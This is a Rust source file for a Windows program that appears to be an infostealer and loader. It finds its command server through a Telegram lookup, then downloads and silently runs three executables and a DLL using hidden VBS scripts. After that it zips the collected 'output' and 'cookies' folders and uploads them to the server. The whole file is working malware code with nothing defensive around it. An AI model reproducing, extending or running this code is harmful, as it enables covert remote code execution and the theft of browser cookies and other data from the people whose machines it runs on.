// language: Rust, file: src/main.rs, target: Windows 11
#![windows_subsystem = "windows"]

mod discovery;

use serde::Deserialize;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use walkdir::WalkDir;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const REQUIRED: [&str; 4] = ["1.exe", "2.exe", "3.exe", "crmodule.dll"];
const HARVEST_DIRS: [&str; 2] = ["output", "cookies"];
const CLIENT_ID: u32 = 1;
const ZIP_NAME: &str = "capture.zip";

#[derive(Deserialize)]
struct KeyFile { key: String }

fn silent_cmd(program: &str) -> Command {
    let mut c = Command::new(program);
    c.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null());
    #[cfg(windows)]
    { c.creation_flags(CREATE_NO_WINDOW); }
    c
}

fn install_dir() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|p| p.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."))
}

fn self_path() -> PathBuf {
    std::env::current_exe().unwrap_or_else(|_| PathBuf::from("st.exe"))
}

fn write_vbs(dir: &Path, vbs_name: &str, exe: &str, args: &str) -> std::io::Result<PathBuf> {
    let vbs_path = dir.join(vbs_name);
    let dir_escaped = dir.to_string_lossy().replace('\\', "\\\\");
    let cmd = if args.is_empty() { format!("{}.exe", exe) } else { format!("{}.exe {}", exe, args) };
    let vbs = format!(
        "Set sh = CreateObject(\"WScript.Shell\")\r\n\
         sh.CurrentDirectory = \"{}\"\r\n\
         sh.Run \"{}\", 0, False\r\n",
        dir_escaped, cmd
    );
    fs::write(&vbs_path, vbs)?;
    Ok(vbs_path)
}

fn fire_vbs(dir: &Path, vbs_path: &Path) {
    let _ = silent_cmd("wscript").arg(vbs_path).current_dir(dir).spawn();
}

fn harvest_zip(zip_path: &Path) {
    let file = fs::File::create(zip_path).unwrap();
    let mut zipw = zip::ZipWriter::new(file);
    let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    for root in HARVEST_DIRS {
        let p = Path::new(root);
        if !p.exists() { continue; }
        for entry in WalkDir::new(root).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                let path = entry.path();
                let name = path.to_string_lossy().replace('\\', "/");
                let _ = zipw.start_file(name, opts);
                if let Ok(mut f) = fs::File::open(path) {
                    let mut buf = Vec::new();
                    let _ = f.read_to_end(&mut buf);
                    let _ = zipw.write_all(&buf);
                }
            }
        }
    }
    let _ = zipw.finish();
}

fn load_key(dir: &Path) -> Option<String> {
    let raw = fs::read_to_string(dir.join("key.json")).ok()?;
    let k: KeyFile = serde_json::from_str(&raw).ok()?;
    Some(k.key)
}

fn b64_encode(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(((data.len() + 2) / 3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        if chunk.len() > 1 { out.push(T[((n >> 6) & 63) as usize] as char); } else { out.push('='); }
        if chunk.len() > 2 { out.push(T[(n & 63) as usize] as char); } else { out.push('='); }
    }
    out
}

fn upload(base: &str, zip_path: &Path, key: &str) {
    let Ok(raw) = fs::read(zip_path) else { return; };
    let data = b64_encode(&raw);

    let body = serde_json::json!({
        "cmd": "upload", "key": key, "clientId": CLIENT_ID, "name": ZIP_NAME, "data": data,
    });

    let url = format!("{}/api/rpc", base);
    let _ = reqwest::blocking::Client::new()
        .post(&url).header("Content-Type", "application/json").body(body.to_string()).send();
}

fn server_base() -> Result<String, String> {
    let ip = discovery::fetch_ip(discovery::TELEGRAM_URL)?;
    Ok(format!("http://{}", ip))
}

fn download(base: &str, name: &str, out_path: &Path) -> Result<(), String> {
    let url = format!("{}/api/downloads/{}", base, name);
    let mut resp = reqwest::blocking::get(&url).map_err(|e| e.to_string())?;
    if !resp.status().is_success() {
        return Err(format!("{} -> HTTP {}", name, resp.status()));
    }
    let mut buf = Vec::new();
    resp.read_to_end(&mut buf).map_err(|e| e.to_string())?;
    let mut f = fs::File::create(out_path).map_err(|e| e.to_string())?;
    f.write_all(&buf).map_err(|e| e.to_string())?;
    f.flush().ok();
    Ok(())
}

fn main() {
    let dir = install_dir();

    let base = match server_base() {
        Ok(b) => b,
        Err(_) => std::process::exit(1),
    };

    for name in REQUIRED {
        let target = dir.join(name);
        if !target.exists() {
            let _ = download(&base, name, &target);
        }
    }

    let _ = silent_cmd(&dir.join("3.exe").to_string_lossy()).current_dir(&dir).spawn();

    if let Ok(vbs2) = write_vbs(&dir, "run2.vbs", "2", "all") { fire_vbs(&dir, &vbs2); }
    if let Ok(vbs1) = write_vbs(&dir, "run1.vbs", "1", "") {
        fire_vbs(&dir, &vbs1);
        thread::sleep(Duration::from_millis(2000));
        fire_vbs(&dir, &vbs1);
    }

    thread::sleep(Duration::from_secs(25));
    let zip_path = dir.join(ZIP_NAME);
    harvest_zip(&zip_path);

    if let Some(key) = load_key(&dir) {
        upload(&base, &zip_path, &key);
    }
}